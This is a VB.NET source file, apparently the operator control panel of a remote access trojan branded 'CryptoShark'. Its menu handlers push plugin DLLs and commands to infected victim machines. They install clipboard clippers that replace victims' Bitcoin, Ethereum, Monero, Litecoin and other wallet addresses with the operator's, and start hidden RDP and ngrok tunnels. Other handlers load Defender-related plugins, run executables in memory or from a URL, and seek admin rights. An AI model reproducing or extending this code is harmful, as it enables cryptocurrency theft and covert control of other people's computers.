    Private Sub ToolStripMenuItem432_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "ETH Buffer", "Your ETH address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem433_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "Doge Buffer", "Your Doge address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(D)[a-zA-HJ-NP-Z0-9]{26,35}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem434_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "Dash Buffer", "Your Dash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem435_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
            Dim openFileDialog2 As OpenFileDialog = openFileDialog
            openFileDialog2.Title = "Select Image"
            openFileDialog2.Filter = "(*.jpg)|*.jpg"
            Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
            If flag Then
                Dim paht As String = openFileDialog.FileName
                Try
                    Dim B As Byte() = SB("WL" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class14.dll")) & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes(paht)))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If

        End If
    End Sub

    Private Sub ToolStripMenuItem436_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("PSleep" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class27.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub



    Private Sub ToolStripMenuItem440_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("RDEC" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class24.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem441_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ngrok")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem443_Click(sender As Object, e As EventArgs)

        If l1.SelectedItems.Count > 0 Then
            If l1.SelectedItems.Count > 1 Then
                MessageBox.Show("this only works with one connection")
            Else
                If l1.Items(l1.FocusedItem.Index).SubItems(8).Text = "True" Then

                    Dim B As Byte() = SB("hrdp")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next

                Else
                    MessageBox.Show("This feature requires UAC bypass or administrator rights")
                End If
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem444_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "taskkill.exe /im ngrok.exe /f")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem445_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class43.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem447_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class36.dll")) & Gclass1.SPL & "1")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem448_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class36.dll")) & Gclass1.SPL & "2")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem449_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class36.dll")) & Gclass1.SPL & "3")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem450_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class13.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem452_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.*)|*.*"
                    .Title = "From Disk"
                End With

                If o.ShowDialog = DialogResult.OK Then
                    Dim B As Byte() = SB("DW" & Gclass1.SPL & Path.GetExtension(o.FileName) & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If

            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub ToolStripMenuItem454_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = Interaction.InputBox("Set URL", "From URL", urle)
            Dim fname As String = "server.exe"
            Dim str4 As String = Interaction.InputBox("Set file name", "file name", fname)
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Gclass1.SPL & str4 & Gclass1.SPL & str3)
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem455_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.exe)|*.exe"
                    .Title = "From Memory"
                End With

                If o.ShowDialog = DialogResult.OK Then
                    Try
                        System.Reflection.Assembly.LoadFile(o.FileName).EntryPoint.GetParameters()
                    Catch
                        MessageBox.Show(o.FileName, "Не является сборкой .NET")
                        Return
                    End Try

                    Dim B As Byte() = SB("FM" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class32.dll")) & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub




    Private Sub buildf_Click(sender As Object, e As EventArgs)
        FrmBuilder.Show()
    End Sub

    Dim strValues As New System.Text.StringBuilder
    Public Property ListViewGroup1 As ListViewGroup
    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs)


        If l1.SelectedItems.Count > 0 Then
            For Each lv As ListViewItem In l1.SelectedItems
                For i As Integer = 0 To lv.SubItems.Count - 1
                    strValues.Append(lv.SubItems(i).Text & ControlChars.Tab)
                Next

                strValues.Append(ControlChars.CrLf)
            Next
        End If


        Clipboard.SetDataObject(strValues.ToString)
    End Sub


    Private Sub ToolStripMenuItem129_Click(sender As Object, e As EventArgs)

    End Sub



    Private Sub ToolStripMenuItem484_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & l1.SelectedItems(0).SubItems(2).Text) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & l1.SelectedItems(0).SubItems(2).Text)
                End If
                Process.Start(Application.StartupPath & "\Downloads" & "\" & l1.SelectedItems(0).SubItems(2).Text)
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub l1_SelectedIndexChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub l1_ItemSelectionChanged(sender As Object, e As ListViewItemSelectionChangedEventArgs)
        Dim m As Message = Message.Create(Me.Handle, &H127, New IntPtr(&H10001), New IntPtr(0))
        Me.WndProc(m)
    End Sub

    Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick

        Try
            ToolStripStatusLabel10.Text = ("Port: " & Gclass1.Port)
            ToolStripStatusLabel11.Text = ("Key: " & Gclass1.KEY)
            ToolStripStatusLabel9.Text = ("In/Out: " + BytesToString(Gclass1.Sent)) + " / " & BytesToString(Gclass1.Received)

            ToolStripStatusLabel8.Text = String.Format("Clients: {0}" + "/" + "{1}", l1.Items.Count.ToString, l1.SelectedItems.Count.ToString)
            Me.Text = "CryptoShark"
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub

    Private Sub method_tr_Tick(sender As Object, e As EventArgs) Handles method_tr.Tick
        Try
            '' uptimeLabel.Text = String.Format("Port {2}               Ngrok Key{3}                   Sent {4}              Received {5}           ", l1.Items.Count.ToString, l1.SelectedItems.Count.ToString, GClass1.class1_0, GClass1.class2_1, BytesToString(GClass1.Sent), BytesToString(GClass1.Received))
            'uptimeLabel.Text = ("Port: " & Gclass1.class1_0)
            'ToolStripStatusLabel1.Text = ("Key: " & Gclass1.class2_1)
            ToolStripStatusLabel3.Text = ("In/Out: " + BytesToString(Gclass1.Sent)) + " / " & BytesToString(Gclass1.Received)
            'ToolStripStatusLabel5.Text = ("Out: ") & BytesToString(GClass1.Received)
            'ToolStripStatusLabel2.Text = String.Format("Clients: {0}" + "/" + "{1}", ListView1.Items.Count.ToString, ListView1.SelectedItems.Count.ToString)
            Me.Text = "CryptoShark"
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub


    Private Sub ToolStripMenuItem5_Click_1(sender As Object, e As EventArgs)
        Dim ars As Integer = 0
        For Each x As ListViewItem In l1.SelectedItems
            ars += 18
        Next
        Dim s(ars - 1) As String
        Dim i As Integer = 0
        For Each x As ListViewItem In l1.SelectedItems
            s(i) = "===" & x.SubItems.Item(1).Text & "==="
            s(i + 1) = "HWID: " & x.SubItems.Item(2).Text
            s(i + 2) = "User / Computer: " & x.SubItems.Item(3).Text
            s(i + 3) = "Country: " & x.SubItems.Item(1).Text
            s(i + 4) = "OS: " & x.SubItems.Item(4).Text
            s(i + 5) = "Stub: " & x.SubItems.Item(5).Text
            s(i + 6) = "Connection data: " & x.SubItems.Item(6).Text
            s(i + 7) = "Flash driver: " & x.SubItems.Item(7).Text
            s(i + 8) = "Permission: " & x.SubItems.Item(8).Text
            s(i + 9) = "Web Camera: " & x.SubItems.Item(9).Text
            s(i + 10) = "Anti-virus: " & x.SubItems.Item(10).Text
            s(i + 11) = "LAN: " & x.SubItems.Item(11).Text
            s(i + 12) = "CPU / GPU: " & x.SubItems.Item(12).Text
            s(i + 13) = "Bit: " & x.SubItems.Item(13).Text
            s(i + 14) = "Type: " & x.SubItems.Item(14).Text
            s(i + 15) = "RAM: " & x.SubItems.Item(15).Text
            s(i + 16) = "Label: " & x.SubItems.Item(16).Text
            s(i + 17) = "====================="
            ''TODO FINISH
            i += 17
        Next
        If i > 0 Then
            Dim zi As String = ""
            For Each z As String In s
                zi += z & vbNewLine
            Next
            Clipboard.SetText(zi)
        End If
    End Sub


    Private Sub guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles guna2Panel1.Paint

    End Sub

    ''' <summary>
    ''' The ReleaseCapture.
    ''' </summary>




    Private Sub toolStripMenuItem68_Click(sender As Object, e As EventArgs)


    End Sub

    Private Sub ToolStripMenuItem3_Click_1(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("RD-")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub toolStripMenuItem62_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem62.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "Monero XMR Clipper", "Your XMR address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(4)[a-zA-HJ-NP-Z0-9]{90,98}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub toolStripMenuItem63_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem63.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "Litecoin Clipper", "Your LiteCoin address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,48}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub toolStripMenuItem64_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem64.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "Bitcoin Cash Clipper

", "Your Bitcoin Cash address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(bitcoincash:|[q])[a-zA-HJ-NP-Z0-9]{26,56}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub toolStripMenuItem65_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem65.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "BTC Buffer", "Your BTC address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub toolStripMenuItem66_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem66.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "ZCash Buffer", "Your ZCash address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "t1[0-9A-z]{33}")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub toolStripMenuItem67_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem67.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "ETH Clipper", "Your ETH address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem11_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem11.Click
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class36.dll")) & Gclass1.SPL & "1")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem12_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem12.Click
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class36.dll")) & Gclass1.SPL & "2")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem14_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem14.Click
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class36.dll")) & Gclass1.SPL & "3")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem15_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem15.Click
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("getinfo")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem6_Click_1(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("rec")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem7.Click
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("CLOSE")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem8.Click
        If l1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are you sure?", "Removal!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
            If result = DialogResult.Yes Then
                Try

                    Dim B As Byte() = SB("uninstall" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class19.dll")))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem9_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem9.Click
        If l1.SelectedItems.Count > 0 Then
            Dim open As OpenFileDialog = New OpenFileDialog

            Dim result As DialogResult = open.ShowDialog()
            If result = DialogResult.OK Then
                Try
                    Dim B As Byte() = SB("update" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class18.dll")) & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes(open.FileName)) & Gclass1.SPL & IO.Path.GetExtension(open.FileName))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem13_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem13.Click
        If l1.SelectedItems.Count > 0 Then
            Dim str3 As String = Interaction.InputBox("Enter label ", "Label")
            Dim B As Byte() = SB("SNote" & Gclass1.SPL & str3)
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
            Try
                For Each C As ListViewItem In l1.SelectedItems
                    If str3 = Nothing Then
                        C.SubItems(11).Text = "N/A"
                    Else
                        C.SubItems(11).Text = str3
                    End If
                Next
                l1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub



    ''' <summary>
    ''' The ReleaseCapture.
    ''' </summary>
    <DllImport("user32.DLL", EntryPoint:="ReleaseCapture")>
    Private Shared Sub ReleaseCapture()
    End Sub

    ''' <summary>
    ''' The SendMessage.
    ''' </summary>
    ''' <paramname="hwnd">The hwnd<seecref="IntPtr"/>.</param>
    ''' <paramname="wmsg">The wmsg<seecref="Integer"/>.</param>
    ''' <paramname="wparam">The wparam<seecref="Integer"/>.</param>
    ''' <paramname="lparam">The lparam<seecref="Integer"/>.</param>
    <DllImport("user32.DLL", EntryPoint:="SendMessage")>
    Private Shared Sub SendMessage(ByVal hwnd As IntPtr, ByVal wmsg As Integer, ByVal wparam As Integer, ByVal lparam As Integer)
    End Sub

    ''' <summary>
    ''' The panel1_MouseDown.
    ''' </summary>
    ''' <paramname="sender">The sender<seecref="Object"/>.</param>
    ''' <paramname="e">The e<seecref="MouseEventArgs"/>.</param>



    Private Sub guna2Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles guna2Panel1.MouseDown
        ReleaseCapture()
        SendMessage(Handle, &H112, &HF012, 0)
    End Sub

    Private Sub ToolStripMenuItem16_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem16.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "DogeCoin Clipper", "Your Doge address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(D)[a-zA-HJ-NP-Z0-9]{26,35}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub form1_QueryAccessibilityHelp(sender As Object, e As QueryAccessibilityHelpEventArgs) Handles MyBase.QueryAccessibilityHelp

    End Sub

    Private Sub ToolStripMenuItem18_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem18.Click
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("admin" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class47.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub guna2GradientButton2_Click(sender As Object, e As EventArgs) Handles guna2GradientButton2.Click
        FrmBuilder.ShowDialog()
    End Sub

    Private Sub guna2GradientButton3_Click(sender As Object, e As EventArgs) Handles guna2GradientButton3.Click
        Process.Start("https://github.com/Richard-Card12?tab=repositories")
    End Sub

    Private Sub guna2GradientButton5_Click(sender As Object, e As EventArgs) Handles guna2GradientButton5.Click
        Process.Start("A/")
    End Sub

    Private Sub ToolStripMenuItem19_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem19.Click
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class43.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub l1_ItemSelectionChanged_1(sender As Object, e As ListViewItemSelectionChangedEventArgs) Handles l1.ItemSelectionChanged
        Dim m As Message = Message.Create(Me.Handle, &H127, New IntPtr(&H10001), New IntPtr(0))

        Me.WndProc(m)
    End Sub

    Private Sub form1_InputLanguageChanging(sender As Object, e As InputLanguageChangingEventArgs) Handles MyBase.InputLanguageChanging

    End Sub
End Class
